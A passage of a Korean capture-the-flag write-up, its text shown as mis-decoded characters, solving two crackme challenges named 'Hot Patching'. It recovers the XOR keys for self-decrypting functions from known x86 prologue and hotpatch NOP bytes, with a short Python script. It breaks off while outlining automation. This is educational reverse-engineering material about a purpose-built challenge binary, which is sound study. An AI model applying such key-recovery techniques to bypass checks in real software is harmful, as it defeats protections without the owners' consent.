</p><h2 id="3e66feff-1093-42d7-8151-0c9586d0acc5" class="">Hot Patching</h2><hr id="224122d1-e93e-4d4b-93ba-72e89ad1730b"/><figure id="21d3e7c1-4597-454a-90c8-cebf22bb5346" class="image"><a href="/assets/2020-09-01/bob/hot_patching_1.png"><img style="width:796px" src="/assets/2020-09-01/bob/hot_patching_1.png"/></a></figure><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="6987453d-bb8c-479e-bb48-baf2a46795da"><div style="font-size:1.5em"><span class="icon">ğŸ’¡</span></div><div style="width:100%">Hot Patching ë°”ì´íŠ¸ë¥¼ í†µí•œ Key ì¶”ì¶œ</div></figure><p id="e6f138b9-b1fa-467f-857e-6b5659011d71" class="">
</p><figure id="e84278d2-915c-44d1-b416-861ece1ac0f1" class="image"><a href="/assets/2020-09-01/bob/01_main.png"><img style="width:462px" src="/assets/2020-09-01/bob/01_main.png"/></a><figcaption>                        [ê·¸ë¦¼ 1] main í•¨ìˆ˜(0x42D7A0) Hex-Rays ê²°ê³¼</figcaption></figure><ul id="13c7236c-5a09-4564-bb4a-9c57e2523983" class="bulleted-list"><li>main í•¨ìˆ˜(0x42D7A0)ì—ì„œ sub_401000ì„ í˜¸ì¶œí•œë‹¤.<p id="a2e5c459-d47a-4508-b0fc-984e40e398d0" class="">
</p><figure id="013d0fde-59f3-4b47-a14f-53a988026eba" class="image"><a href="/assets/2020-09-01/bob/02_401000.png"><img style="width:658px" src="/assets/2020-09-01/bob/02_401000.png"/></a><figcaption>                                                     [ê·¸ë¦¼ 2] sub_401000 í•¨ìˆ˜ Hex-Rays ê²°ê³¼</figcaption></figure></li></ul><ul id="7605cae9-9a30-4acc-996d-60189c06b982" class="bulleted-list"><li>sub_401000ì€ ìœ„ì™€ ê°™ë‹¤.</li></ul><p id="cc657dc8-1a18-4d33-8bc6-47fb63f39ebf" class="">
</p><figure id="cb06f9bc-485e-4c87-8d59-5b3dbe20d263" class="image"><a href="/assets/2020-09-01/bob/03_42D710.png"><img style="width:509px" src="/assets/2020-09-01/bob/03_42D710.png"/></a><figcaption>                                  [ê·¸ë¦¼ 3] Xorì„ ìˆ˜í–‰í•˜ëŠ” sub_42D710 í•¨ìˆ˜</figcaption></figure><ul id="8b583f8e-2b93-45cc-b573-b474c574211f" class="bulleted-list"><li>sub_42D710ëŠ” sub_401000ì—ì„œ ë‘ ë²ˆ í˜¸ì¶œëœë‹¤.
VirtualProtectë¥¼ í†µí•´ íŠ¹ì • ì˜ì—­ì˜ ë©”ëª¨ë¦¬ë¥¼ PAGE_EXECUTE_READWRITE(0x40)ìœ¼ë¡œ ë³€ê²½ì‹œí‚¨ë‹¤.
ê·¸ í›„ ì„¸ë²ˆ ì§¸ ì¸ì ê°’ì„ ì°¸ì¡°í•˜ì—¬ Xor ì—°ì‚° í•œë‹¤.</li></ul><p id="f04502d4-aa04-47d0-b8c7-13faa08a4ab5" class="">
</p><figure id="dcf63de5-941b-4367-aa92-6d21215ff902" class="image"><a href="/assets/2020-09-01/bob/04_sub_401000.png"><img style="width:604px" src="/assets/2020-09-01/bob/04_sub_401000.png"/></a><figcaption>                                     [ê·¸ë¦¼ 4] sub_401000 í•¨ìˆ˜ ë™ì‘ íŒŒì•… í›„ ë„¤ì´ë° ê²°ê³¼</figcaption></figure><ul id="f7f2155a-513d-43c0-b8a8-f29725846283" class="bulleted-list"><li>sub_401000 í•¨ìˆ˜ ë‚´ ë³€ìˆ˜ ë° í•¨ìˆ˜ ì´ë¦„ì„ ë³´ê¸° ì‰½ê²Œ ë„¤ì´ë°í•˜ì˜€ë‹¤.</li></ul><ul id="9044899c-b60b-478a-8e78-6660947fcff2" class="bulleted-list"><li>í•´ë‹¹ í•¨ìˆ˜ì˜ ì‹¤í–‰ íë¦„ì€ ë‹¤ìŒê³¼ ê°™ë‹¤.<ol id="aef5efd6-5eb4-47f0-b457-29d58abda398" class="numbered-list" start="1"><li>scanf_s í•¨ìˆ˜ë¥¼ í†µí•´ ì…ë ¥ì„ ë°›ëŠ”ë‹¤.</li></ol><ol id="87dd3407-51b5-4417-a2a4-f6151c88b07d" class="numbered-list" start="2"><li><strong>ì…ë ¥ ê°’</strong>ì˜ ê¸€ì ìˆ˜ë¥¼ í™•ì¸í•˜ê³ , <strong>5ê¸€ì</strong>ê°€ ì•„ë‹ ì‹œ 1ì„ ë°˜í™˜í•œë‹¤.</li></ol><ol id="24e6d6bc-c45b-4ae3-aa98-5390709f2bc3" class="numbered-list" start="3"><li><strong>0x4010D0</strong> ì£¼ì†Œì—ì„œ 0x2C630(0x42D700 - 0x4010D0) í¬ê¸° ë§Œí¼ <strong>ì…ë ¥ ê°’</strong>ê³¼ <strong>Xor</strong> ì—°ì‚° í•œë‹¤.</li></ol><ol id="55b76fd4-10eb-4a24-8624-2c0eb6828f8d" class="numbered-list" start="4"><li><strong>0x44A8C0</strong> ì£¼ì†Œì—ì„œ 0x20 í¬ê¸° ë§Œí¼ <strong>ì…ë ¥ ê°’</strong>ê³¼ <strong>Xor</strong> ì—°ì‚° í•œë‹¤.</li></ol><ol id="f8c7101f-192b-40de-9ba8-944d8b828cab" class="numbered-list" start="5"><li>Xor ì—°ì‚° í›„ì˜ <strong>0x4010D0</strong> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œë‹¤.</li></ol></li></ul><figure id="7a08cb7d-cbd1-4669-b0f8-9c3aa4cb2966" class="image"><a href="/assets/2020-09-01/bob/05_4010D0.png"><img style="width:587px" src="/assets/2020-09-01/bob/05_4010D0.png"/></a><figcaption>                                               [ê·¸ë¦¼ 5] Xor ì—°ì‚° ì „ sub_4010D0 í•¨ìˆ˜</figcaption></figure><ul id="534f1888-e0b9-434f-bde0-2e5bc17d9116" class="bulleted-list"><li>Xor ì—°ì‚° ì „ 0x4010D0 í•¨ìˆ˜ëŠ” ìœ„ì™€ ê°™ì´ ìƒê²¼ë‹¤. ì‹¤í–‰ ê°€ëŠ¥í•œ ì–´ì…ˆë¸”ë¦¬ ì½”ë“œë¡œëŠ” ë³´ì´ì§€ ì•ŠëŠ”ë‹¤.</li></ul><p id="b887ac21-9343-41e2-9208-0d688d86dc14" class="block-color-gray">                                     <strong><em>&quot;ê·¸ë ‡ë‹¤ë©´, ì…ë ¥ ê°’ì´ 5ê¸€ìì¸ ê²ƒ ì™¸ì— ë‹¨ì„œëŠ” ë¬´ì—‡ì´ ìˆì„ê¹Œ?&quot;</em></strong></p><ul id="68e771a6-56bd-4ec5-bda8-a02c07ca291d" class="bulleted-list"><li>0x4010D0ì€ ë‹¤ë¥¸ í•¨ìˆ˜ì™€ ê³µí†µëœ <mark class="highlight-blue"><strong><a href="https://en.wikipedia.org/wiki/Function_prologue">í•¨ìˆ˜ í”„ë¡¤ë¡œê·¸</a></strong></mark>ë¥¼ ê°€ì§€ê³  ìˆì„ ê²ƒì´ë‹¤.
x86 ì‹¤í–‰ ë°”ì´ë„ˆë¦¬ëŠ” í•¨ìˆ˜ ì‹œì‘ ì‹œ ì•„ë˜ì™€ ê°™ì€ í•¨ìˆ˜ í”„ë¡¤ë¡œê·¸ë¥¼ ê°€ì§€ê³  ìˆë‹¤.</li></ul><pre id="1507b36c-3e98-4add-bed0-465f687bf604" class="code code-wrap"><code><mark class="highlight-teal">55        </mark><mark class="highlight-blue">push </mark><mark class="highlight-pink">ebp</mark>
<mark class="highlight-teal">8B EC</mark>     <mark class="highlight-blue">mov </mark><mark class="highlight-pink">ebp</mark>, <mark class="highlight-pink">esp</mark><mark class="highlight-teal">
83 EC XX</mark>  <mark class="highlight-blue">sub </mark><mark class="highlight-pink">esp</mark>, <mark class="highlight-teal">N</mark></code></pre><figure id="89aa2cd1-4ac2-4401-a623-633dfc1579b8" class="image"><a href="/assets/2020-09-01/bob/06_prol.png"><img style="width:363px" src="/assets/2020-09-01/bob/06_prol.png"/></a><figcaption>                         [ê·¸ë¦¼ 6] í•¨ìˆ˜ ì´ˆê¸° í”„ë¡¤ë¡œê·¸</figcaption></figure><ul id="6feebefa-3e7b-43bf-b1e5-153e36779850" class="bulleted-list"><li>ë¬¸ì œ ë°”ì´ë„ˆë¦¬ì—ì„œëŠ” í•¨ìˆ˜ í”„ë¡¤ë¡œê·¸ ì´ì „ì— 2ë°”ì´íŠ¸ ì–´ì…ˆë¸”ë¦¬ <mark class="highlight-blue"><code>xchg</code></mark><code><mark class="highlight-pink">ax</mark></code><mark class="highlight-gray"><code>,</code></mark><mark class="highlight-pink"><code>ax</code></mark> ê°€ ë³´ì¸ë‹¤.
í•´ë‹¹ ì–´ì…ˆë¸”ë¦¬ëŠ” 2ë°”ì´íŠ¸ NOP ì½”ë“œ <code>0x66 0x90</code> ì´ë‹¤.
Visual Studio ì»´íŒŒì¼ ì‹œ <mark class="highlight-blue"><strong><a href="https://docs.microsoft.com/ko-kr/cpp/build/reference/hotpatch-create-hotpatchable-image?view=vs-2019">HotPatch ì˜µì…˜</a></strong></mark>ì´ í™œì„±í™” ëœ ê²½ìš° ìƒê¸°ëŠ” ì½”ë“œì´ë‹¤.</li></ul><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="142cc00d-674c-41ae-9771-05b2cea11167"><div style="font-size:1.5em"><span class="icon">âœ…</span></div><div style="width:100%"><mark class="highlight-blue"><a href="https://en.wikipedia.org/wiki/Patch_(computing)#Hot_patching"><strong>Hot Patching</strong></a></mark><mark class="highlight-blue"><strong>[1]</strong></mark>ì´ë€, ì„œë¹„ìŠ¤ì˜ ì¢…ë£Œë‚˜ ì¬ì‹œì‘ ì—†ì´ íŒ¨ì¹˜ë¥¼ ì ìš©í•˜ëŠ” ì—…ë°ì´íŠ¸ ë°©ë²•ì´ë‹¤.
x86 ì–´ì…ˆë¸”ë¦¬ ì–¸ì–´ì—ì„œëŠ” íŒ¨ì¹˜ë¥¼ ìœ„í•´ LONG JMP ëª…ë ¹ì„ ì‚¬ìš©í•œë‹¤.
í•´ë‹¹ ëª…ë ¹ì€ 5ë°”ì´íŠ¸ê°€ í•„ìš”í•˜ë¯€ë¡œ, <strong>3ë°”ì´íŠ¸</strong>ì¸ <strong>í•¨ìˆ˜ í”„ë¡¤ë¡œê·¸</strong> ì™¸ <strong>2ë°”ì´íŠ¸</strong>ì˜<strong> NOP ì½”ë“œ</strong>ë¥¼
ì¶”ê°€í•˜ì—¬ <mark class="highlight-blue"><strong><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc782258(v=ws.10)?redirectedfrom=MSDN">Hot Patching</a></strong></mark><mark class="highlight-blue"><strong>[2]</strong></mark>ì— ì‚¬ìš©í•œë‹¤.

<mark class="highlight-gray"><strong><em>Windows x86 ë¼ì´ë¸ŒëŸ¬ë¦¬ ëª¨ë“ˆì—ì„œëŠ” ì£¼ë¡œ</em></strong></mark> <mark class="highlight-blue"><code>mov</code></mark><mark class="highlight-pink"><code>edi</code></mark><mark class="highlight-gray"><code>,</code></mark><mark class="highlight-pink"><code>edi</code></mark> <mark class="highlight-gray"><strong><em>ë¥¼ ì‚¬ìš©í•œë‹¤.</em></strong></mark></div></figure><p id="65bcbaae-46f3-4868-bb0b-369b174fb4f0" class="">
</p><ul id="732c508e-2344-44f3-885e-15e9b45bbe92" class="bulleted-list"><li>Hot Patchingì— ì‚¬ìš©í•  5ë°”ì´íŠ¸ <code>0x66 0x90 0x55 0x8B 0xEC</code> ë¥¼ í†µí•´, ì…ë ¥ ê°’ì„ êµ¬í•  ìˆ˜ ìˆë‹¤.
<strong>apple </strong><mark class="highlight-blue"><code>0x61 0x70 0x70 0x6C 0x65</code></mark><code>=</code><mark class="highlight-teal"><code>0x07 0xE0 0x25 0xE7 0x89</code></mark><mark class="highlight-yellow"><strong><code>Xor</code></strong></mark><code>0x66 0x90 0x55 0x8B 0xEC</code></li></ul><figure id="9e6783cd-d44e-45e7-ab9c-2e4708ff8f35" class="image"><a href="/assets/2020-09-01/bob/07_apple.png"><img style="width:499px" src="/assets/2020-09-01/bob/07_apple.png"/></a><figcaption>                                          [ê·¸ë¦¼ 7] apple ì…ë ¥ í›„ í™”ë©´</figcaption></figure><ul id="225bd3d8-0c6c-496f-9ada-54c7983373c4" class="bulleted-list"><li>appleì„ ì…ë ¥í•˜ë‹ˆ ë˜ ë‹¤ì‹œ ì…ë ¥ì„ ë°›ëŠ”ë‹¤.</li></ul><figure id="6e3e91bd-22db-430b-b31f-20b1ed2dc26d" class="image"><a href="/assets/2020-09-01/bob/08_code.png"><img style="width:608px" src="/assets/2020-09-01/bob/08_code.png"/></a><figcaption>                                          [ê·¸ë¦¼ 8] Xor ì—°ì‚° í›„ 0x4010D0 ë””ìŠ¤ì–´ì…ˆë¸” ê²°ê³¼</figcaption></figure><ul id="95ac8f51-7eea-4e24-8cb0-d4b5437c4633" class="bulleted-list"><li>Xor ì—°ì‚°ì„ ìˆ˜í–‰í•œ 0x4010D0 ë¶€ë¶„ì˜ ì½”ë“œê°€ ì •ìƒì ìœ¼ë¡œ ë³´ì¸ë‹¤.</li></ul><p id="fb23462d-1e20-4c6f-974f-45fe65eb21da" class="">
</p><figure id="1b6b2a02-32fd-450a-9f4e-5bdbb6921241" class="image"><a href="/assets/2020-09-01/bob/09_code2.png"><img style="width:640px" src="/assets/2020-09-01/bob/09_code2.png"/></a><figcaption>                                               [ê·¸ë¦¼ 9] 0x4010D0 í•¨ìˆ˜ì˜ ì…ë ¥ ê°’ ì‚¬ìš©</figcaption></figure><ul id="ca2eb4d6-c85e-4018-86b9-953ee6cb77ab" class="bulleted-list"><li>ë‹¤ìŒ ì…ë ¥ ê°’ì˜ í¬ê¸°ëŠ” 5ì´ë©°, 0x4011A0 ì£¼ì†Œì™€ Xor ì—°ì‚°í•˜ëŠ” ê²ƒìœ¼ë¡œ ë³´ì¸ë‹¤.
ì—°ì‚°í•  í¬ê¸°ëŠ” 0x2C560(0x42D700 - 0x4011A0)ì´ë‹¤.</li></ul><ul id="56a540b1-e656-4665-af98-a347a0b7cde2" class="bulleted-list"><li><strong>apple</strong>ê³¼ ê°™ì€ ë°©ë²•ìœ¼ë¡œ ì…ë ¥ ê°’ <strong>mango</strong>ë¥¼ êµ¬í•  ìˆ˜ ìˆë‹¤.
<mark class="highlight-gray"><em><strong>*appleì„ ì…ë ¥ í›„ ë°”ë€ 0x4010A0 ~ 0x4010A4 ë²”ìœ„ì˜ ê°’ì„ ì‚¬ìš©í•´ì•¼í•œë‹¤.</strong></em></mark></li></ul><ul id="c6928362-d948-455a-9ded-76d1c0374ec5" class="bulleted-list"><li>ê°™ì€ ë°©ë²•ìœ¼ë¡œ ë‹¤ìŒ ì…ë ¥ ê°’ <strong>lemon</strong>ì„ êµ¬í•  ìˆ˜ ìˆë‹¤.</li></ul><p id="fe695799-36c5-40e5-82ea-b63814ed9652" class="">
</p><figure id="f69472f2-90e4-4e2e-b60e-5806d11e1ce3" class="image"><a href="/assets/2020-09-01/bob/10_code3.png"><img style="width:647px" src="/assets/2020-09-01/bob/10_code3.png"/></a><figcaption>                                              [ê·¸ë¦¼ 10] 0x401270 í•¨ìˆ˜ì—ì„œ 6ê¸€ì ì…ë ¥ ê°’ ìš”êµ¬ </figcaption></figure><ul id="79683aec-7586-431d-afb2-aab7129d8ab0" class="bulleted-list"><li>ì„¸ ë²ˆì§¸ ì…ë ¥ ê°’ lemon ì´í›„ì—ëŠ” ì…ë ¥ ê°’ì´ 6ìœ¼ë¡œ ì¦ê°€í•œë‹¤.</li></ul><ul id="b80003c6-9213-4528-bb6c-65abfaf4cfbc" class="bulleted-list"><li>ê·¸ë˜ë„ ì•Œë ¤ì§„ 5ë°”ì´íŠ¸ë¥¼ í†µí•´ <strong>orang</strong> 5ê¸€ìë¥¼ êµ¬í•  ìˆ˜ ìˆë‹¤.
ì´ì „ì— ê³¼ì¼ì´ ë‚˜ì™”ìœ¼ë¯€ë¡œ <strong>orange</strong>ë¡œ ìœ ì¶”í•´ ë³¼ ìˆ˜ ìˆë‹¤.
ë˜í•œ  <mark class="highlight-blue"><code>sub</code></mark><code><mark class="highlight-pink">esp</mark></code><mark class="highlight-gray"><code>,</code></mark><mark class="highlight-teal"><code>N</code></mark>  ì½”ë“œì˜ <code>0x83 0xEC 0x??</code> ë¥¼ í†µí•´ì„œ ì´ ìµœëŒ€ 7ê¸€ìë¥¼ êµ¬í•  ìˆ˜ ìˆë‹¤.</li></ul><p id="f1a386c4-719a-4136-9a8c-0ca1b1e3e15a" class="">
</p><figure id="05ec8e3f-eb06-4a2c-a5e4-c033f06bf8ca" class="image"><a href="/assets/2020-09-01/bob/11_flag.png"><img style="width:499px" src="/assets/2020-09-01/bob/11_flag.png"/></a><figcaption>                                                [ê·¸ë¦¼ 11] Flag ì¶œë ¥</figcaption></figure><ul id="cda11258-2765-4a9f-95c9-8ff5266d5ac9" class="bulleted-list"><li>ì•Œë ¤ì§„ 7ë°”ì´íŠ¸ì™€ ìœ ì¶”ë¥¼ í†µí•´ì„œ Keyë¥¼ ì´ 10ë²ˆ ì…ë ¥í•˜ë©´ Flagë¥¼ íšë“í•  ìˆ˜ ìˆë‹¤.</li></ul><pre id="d5806112-41dc-47f0-8714-bd7e4a5a317b" class="code code-wrap"><code>key_info = [
    {&quot;addr&quot;:0x4010D0, &quot;size&quot;:5, &quot;data&quot;:[0x07, 0xE0, 0x25, 0xE7, 0x89]},
    {&quot;addr&quot;:0x4011A0, &quot;size&quot;:5, &quot;data&quot;:[0x0B, 0xF1, 0x3B, 0xEC, 0x83]},
    {&quot;addr&quot;:0x401270, &quot;size&quot;:5, &quot;data&quot;:[0x0A, 0xF5, 0x38, 0xE4, 0x82]},
    {&quot;addr&quot;:0x401350, &quot;size&quot;:6, &quot;data&quot;:[0x09, 0xE2, 0x34, 0xE5, 0x8B, 0xE6]},
    {&quot;addr&quot;:0x401430, &quot;size&quot;:6, &quot;data&quot;:[0x04, 0xF1, 0x3B, 0xEA, 0x82, 0xE2]},
    {&quot;addr&quot;:0x401510, &quot;size&quot;:6, &quot;data&quot;:[0x02, 0xE5, 0x27, 0xE2, 0x8D, 0xED]},
    {&quot;addr&quot;:0x4015F0, &quot;size&quot;:7, &quot;data&quot;:[0x05, 0xE5, 0x27, 0xF9, 0x8D, 0xED, 0x98]},
    {&quot;addr&quot;:0x4016D0, &quot;size&quot;:7, &quot;data&quot;:[0x07, 0xE6, 0x3A, 0xE8, 0x8D, 0xE7, 0x83]},
    {&quot;addr&quot;:0x4017B0, &quot;size&quot;:7, &quot;data&quot;:[0x05, 0xFF, 0x36, 0xE4, 0x82, 0xF6, 0x98]},
    {&quot;addr&quot;:0x401890, &quot;size&quot;:8, &quot;data&quot;:[0x0B, 0xF1, 0x3B, 0xEF, 0x8D, 0xF1, 0x85, 0x4E]}
]

known_bytes = [0x66, 0x90, 0x55, 0x8B, 0xEC, 0x83, 0xEC]
for k in key_info:
    data = k[&quot;data&quot;]
    key = &quot;&quot;
    size = len(data)
    for i in range(size):
        key += chr(data[i] ^ known_bytes[i % 7])

    print(key[:5] + &quot;?&quot; * (size - 5), &quot;=&gt;&quot;, key) #Known Bytes Size == 5, 7


&quot;&quot;&quot; #Result
apple =&gt; apple
mango =&gt; mango
lemon =&gt; lemon
orang? =&gt; orange
banan? =&gt; banana
duria? =&gt; durian
curra?? =&gt; currant
avoca?? =&gt; avocado
cocon?? =&gt; coconut
manda??? =&gt; mandari? =&gt; mandarin*
&quot;&quot;&quot;</code></pre><p id="a853b5e4-a484-4510-b239-d8726314ad57" class="">
</p><h2 id="df3280c0-969a-49cc-9676-84ad8f7a4a64" class="">Hot Patching 777</h2><hr id="2b577b15-498e-4c16-b9bc-4ff613012d6e"/><figure id="b80f35bb-c88c-4402-8636-94f7c53a3493" class="image"><a href="/assets/2020-09-01/bob/hot_patching_2.png"><img style="width:794px" src="/assets/2020-09-01/bob/hot_patching_2.png"/></a></figure><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="506b24c3-604b-4066-9a9e-d859bbdd03fd"><div style="font-size:1.5em"><span class="icon">ğŸ’¡</span></div><div style="width:100%">ê³µí†µëœ ëª…ë ¹ ë°”ì´íŠ¸ë¥¼ í†µí•œ Key ì¶”ì¶œ ìë™í™” </div></figure><ul id="8675e56c-50e6-453a-bf8a-bdd6add505b8" class="bulleted-list"><li>ì´ì „ <strong>Hot Patching</strong> ë¬¸ì œëŠ” ë³„ë„ì˜ ìë™í™” ì—†ì´ ë¬¸ì œë¥¼ í•´ê²°í•  ìˆ˜ ìˆì—ˆë‹¤.</li></ul><figure id="0dac0582-8a18-4986-988e-ec957f980b3c" class="image"><a href="/assets/2020-09-01/bob/12_flag_xor.png"><img style="width:651px" src="/assets/2020-09-01/bob/12_flag_xor.png"/></a><figcaption>                                        [ê·¸ë¦¼ 1] 0x401890 í•¨ìˆ˜ì—ì„œ Flag ì¶œë ¥ í›„ ì—°ì‚° ë°ì´í„°</figcaption></figure><ul id="189152bf-8afa-4ee7-b4c4-860fcefb8c68" class="bulleted-list"><li>0x401890 í•¨ìˆ˜ì—ì„œ ì²« ë²ˆì§¸ Flagë¥¼ ì¶œë ¥í•´ì£¼ê³ , ë‹¤ìŒ Flagë¥¼ ìœ„í•œ ì—°ì‚°ì´ ìˆ˜í–‰ëœë‹¤.</li></ul><figure id="2924fe53-ed31-479b-95e8-1707104d7c91" class="image"><a href="/assets/2020-09-01/bob/13_11th_function.png"><img style="width:684px" src="/assets/2020-09-01/bob/13_11th_function.png"/></a><figcaption>                             [ê·¸ë¦¼ 2] 0x401890 í•¨ìˆ˜ì—ì„œ ë³„ë„ ì…ë ¥ ì²˜ë¦¬ ì—†ì´ ë‹¤ìŒ í•¨ìˆ˜ ë³µí˜¸í™” ìˆ˜í–‰</figcaption></figure><ul id="1577556a-30a2-4f8f-a3a9-d129076c519f" class="bulleted-list"><li>10 ë²ˆì§¸ Keyê¹Œì§€ ëª¨ë‘ ì˜¬ë°”ë¥´ê²Œ ì…ë ¥ëœ ê²½ìš°, ë‹¤ìŒ í•¨ìˆ˜ëŠ” ë³„ë„ ì…ë ¥ ì²˜ë¦¬ ì—†ì´ ë³µí˜¸í™” ëœë‹¤. </li></ul><figure id="5fd0afb5-29ad-4db8-a20f-62a74896ddea" class="image"><a href="/assets/2020-09-01/bob/14_length.png"><img style="width:644px" src="/assets/2020-09-01/bob/14_length.png"/></a><figcaption>                                                [ê·¸ë¦¼ 3] 0x4019B0 í•¨ìˆ˜ì—ì„œ ì…ë ¥ ê°’ ê²€ì‚¬</figcaption></figure><ul id="50f8cf6b-4ca8-4f42-a4e6-93425b10a2e9" class="bulleted-list"><li>ì²« ë²ˆì§¸ Flag ì¶œë ¥ ì´ì „ê¹Œì§€ëŠ” 5~8 ê¸€ìì˜ ì…ë ¥ ê°’ì´ í•„ìš”í–ˆì§€ë§Œ, 11 ë²ˆì§¸ëŠ” 17 ê¸€ìë¥¼ ìš”êµ¬í•œë‹¤.</li></ul><ul id="d78fd124-3517-4ab7-86e2-1124653b1ff4" class="bulleted-list"><li>ì•Œë ¤ì§„ 7ë°”ì´íŠ¸ë¥¼ í†µí•´, ì¼ë¶€ë¥¼ ë³µêµ¬í•˜ì—¬ë„ ì´ì „ê³¼ ë‹¤ë¥´ê²Œ íŠ¹ì • ë‹¨ì–´ë¡œ ì¶”ì •í•  ìˆ˜ ì—†ë‹¤.
<strong>TO5yQyc </strong><mark class="highlight-blue"><code>0x54 0x4F 0x35 0x79 0x51 0x79 0x63
</code></mark><mark class="highlight-blue">            </mark><code>=</code><mark class="highlight-teal"><code>0x32 0xDF 0x60 0xF2 0xBD 0xFA 0x8F</code></mark><mark class="highlight-yellow"><strong><code>Xor</code></strong></mark><code>0x66 0x90 0x55 0x8B 0xEC 0x83 0xEC</code>
                                <mark class="highlight-gray"> </mark><mark class="highlight-gray"><strong><em>&quot;ê·¸ë ‡ë‹¤ë©´, ì•Œë ¤ì§„ 7ë°”ì´íŠ¸ ì™¸ì— ë‹¨ì„œê°€ í•„ìš”í•˜ë‹¤.&quot;</em></strong></mark></li></ul><p id="9f2ba1b9-d2de-4fbd-8668-41be4cb265c3" class="">
</p><ul id="09890ce5-4989-4bde-999f-1f80e19db6a7" class="bulleted-list"><li>ì§€ê¸ˆê¹Œì§€ Flag ì¶œë ¥ í•¨ìˆ˜ ì™¸ ëª¨ë“  í•¨ìˆ˜ëŠ” ê°™ì€ í˜•ì‹ìœ¼ë¡œ êµ¬ì„±ë˜ì–´ìˆë‹¤.
ë‹¤ë¥¸ ì ì€ ì…ë ¥ ê°’ì˜ í¬ê¸°, ë³µí˜¸í™” ëŒ€ìƒ ì£¼ì†Œ, ë‹¤ìŒ í•¨ìˆ˜ ì£¼ì†Œ ë“±ì´ë‹¤.</li></ul><figure id="b2c5c3a4-e89e-4cdc-a9ce-edc1282eecbf" class="image"><a href="/assets/2020-09-01/bob/15_dummy.png"><img style="width:643px" src="/assets/2020-09-01/bob/15_dummy.png"/></a><figcaption>                                             [ê·¸ë¦¼ 4] í•¨ìˆ˜ ì¤‘ê°„ ì¤‘ê°„ ì¡´ì¬í•˜ëŠ” ë”ë¯¸ì½”ë“œ</figcaption></figure><ul id="627ed198-63aa-4436-b3ea-dce31431fb19" class="bulleted-list"><li>í•¨ìˆ˜ì˜ ë‚´ìš©ì€ ëª¨ë‘ ê°™ì§€ë§Œ, ì¤‘ê°„ ì¤‘ê°„ ë”ë¯¸ì½”ë“œê°€ í˜¼ë€ì„ ì£¼ê³  ìˆë‹¤.
ë”ë¯¸ì½”ë“œì˜ ì˜í–¥ì„ ë°›ì§€ ì•Šìœ¼ë©´ì„œ ê³µí†µëœ ì–´ì…ˆë¸”ë¦¬ ì½”ë“œë¥¼ ì°¾ì•„ì•¼í•œë‹¤.</li></ul><figure id="774fc154-32ea-4d71-b6de-1f44e560a49e" class="image"><a href="/assets/2020-09-01/bob/16_common.png"><img style="width:644px" src="/assets/2020-09-01/bob/16_common.png"/></a><figcaption>                                                     [ê·¸ë¦¼ 5] ê³µí†µëœ strlen ê¸°ëŠ¥ ì½”ë“œ</figcaption></figure><ul id="0a322ebe-3ba7-41a8-8670-d7f663a91392" class="bulleted-list"><li>strlen ê¸°ëŠ¥ì˜ ì½”ë“œ ë•ë¶„ì— ë¬´ë ¤ 58ë°”ì´íŠ¸ì˜ ê³µí†µ ì½”ë“œë¥¼ ì°¾ì„ ìˆ˜ ìˆë‹¤.
<mark class="highlight-gray"><em><strong>*ë§ˆì§€ë§‰ cmp ëª…ë ¹ì˜ ê¸€ììˆ˜(0x07) ë¹„êµ ì „ ê¹Œì§€ 58 ë°”ì´íŠ¸</strong></em></mark></li></ul><figure id="e0ba5397-89da-4e16-91a3-8a02f1940734" class="image"><a href="/assets/2020-09-01/bob/17_scan.png"><img style="width:725px" src="/assets/2020-09-01/bob/17_scan.png"/></a><figcaption>                                                                       [ê·¸ë¦¼ 6] ê³µí†µ ì½”ë“œ ë©”ëª¨ë¦¬ ê²€ìƒ‰ ê²°ê³¼</figcaption></figure><ul id="b8a7d81f-bb8f-4ed4-bd6d-61bf5aa6dfa2" class="bulleted-list"><li>í˜„ì¬ Flag ì¶œë ¥ ì™¸ 11ê°œ í•¨ìˆ˜ê°€ ë³µí˜¸í™”ë˜ì–´ìˆë‹¤. ê³µí†µ ì½”ë“œë¥¼ ê²€ìƒ‰í•œ ê²°ê³¼ ë˜í•œ 11ê°œë‹¤.
ì´ë¥¼ í™œìš©í•˜ì—¬ ì…ë ¥ ê°’ ì¶”ì¶œ ìë™í™”ë¥¼ ìˆ˜í–‰í•  ìˆ˜ ìˆë‹¤.</li></ul><ul id="d8844cf5-0971-47a3-bcef-2f496c4e3c88" class="bulleted-list"><li>ì•„ë˜ì™€ ê°™ì€ ë‚´ìš©ì„ í† ëŒ€ë¡œ ìë™í™” ì½”ë“œë¥¼ ì‘ì„±í•˜ì˜€ë‹¤.<ol id="9ca8257e-5540-47c2-9a6b-0a963e132070" class="numbered-list" start="1"><li>ë””ìŠ¤ì–´ì…ˆë¸”ëŸ¬ë¥¼ í†µí•´, cmp ëª…ë ¹ì–´ì—ì„œ ë¹„êµí•  ì…ë ¥ ê°’ì„ êµ¬í•œë‹¤.</li></ol><ol id="d22b7fa3-ad40-40c0-88ec-0adb673e309d" class="numbered-list" start="2"><li>ì´í›„ sub ëª…ë ¹ì–´ì—ì„œ Xor ì—°ì‚° ì‹œì‘ ì£¼ì†Œë¥¼ êµ¬í•œë‹¤.</li></ol><ol id="d72254cc-a3a5-4be6-a257-4c391e8b88b1" class="numbered-list" start="3"><li>ì•Œë ¤ì§„ 5ë°”ì´íŠ¸ë¥¼ í†µí•´, ì…ë ¥ ê°’ì˜ ì²« 5ê¸€ìë¥¼ íšë“í•œë‹¤.</li></ol><ol id="1d9ae61d-1643-4f0a-a57d-a7cac8f65caf" class="numbered-list" start="4"><li>ì²« 5ê¸€ìë¥¼ íŒ¨ì¹˜ ëŒ€ìƒ ë°ì´í„°ì™€ Xor ì—°ì‚°í•˜ê³ , ê³µí†µ ì½”ë“œ 58ë°”ì´íŠ¸ì— í¬í•¨ë˜ëŠ”ì§€ í™•ì¸í•œë‹¤.</li></ol><ol id="be0b13bc-e92d-4e55-b3fd-1fe2a38dc4b5" class="numbered-list" start="5"><li>í¬í•¨ë  ê²½ìš° ì…ë ¥ ê°’ì„ ì¶”ì¶œí•  ìˆ˜ ìˆë‹¤.</li></ol><ol id="1cb51f5f-0273-4e6d-b6fc-c0ae75fa070f" class="numbered-list" start="6"><li>ë””ìŠ¤ì–´ì…ˆë¸”ëŸ¬, ì½”ë“œ íŒ¨ì¹˜ ê¸°ëŠ¥ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆëŠ” 